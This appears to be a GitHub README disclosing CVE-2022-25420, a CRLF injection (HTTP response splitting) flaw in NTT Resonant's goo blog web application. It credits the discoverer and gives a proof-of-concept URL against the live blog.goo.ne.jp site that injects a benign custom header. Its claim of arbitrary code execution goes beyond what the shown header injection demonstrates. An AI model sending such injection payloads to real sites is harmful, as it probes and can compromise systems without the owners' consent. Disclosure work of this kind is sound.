# goo-blog-App
# CVE-2022-25420

## Description 
NTT Resonant Incorporated goo blog App Web Application 1.0 is vulnerable to CLRF injection. This vulnerability allows attackers to execute arbitrary code via a crafted HTTP request.

------------------------------------------
## Vulnerability Name
CRLF injection/HTTP response splitting

## Vendor of Product:
NTT Resonant Incorporated

## Affected Product Code Base
goo blog App - Web Application 1.0

## Affected Component
blog.goo.ne.jp

## Attack Type
Remote

## Proof of Concepts:
Open the URL to exploit the vulnerability
URL: https://blog.goo.ne.jp/portal/xmarchel/7%0d%0aCustomInjectionHeader:%20injected_by_abhiunix

![](https://raw.githubusercontent.com/abhiunix/goo-blog-App-CVE/master/crlf.png)

## Discoverer
Abhijeet Singh (abhiunix)
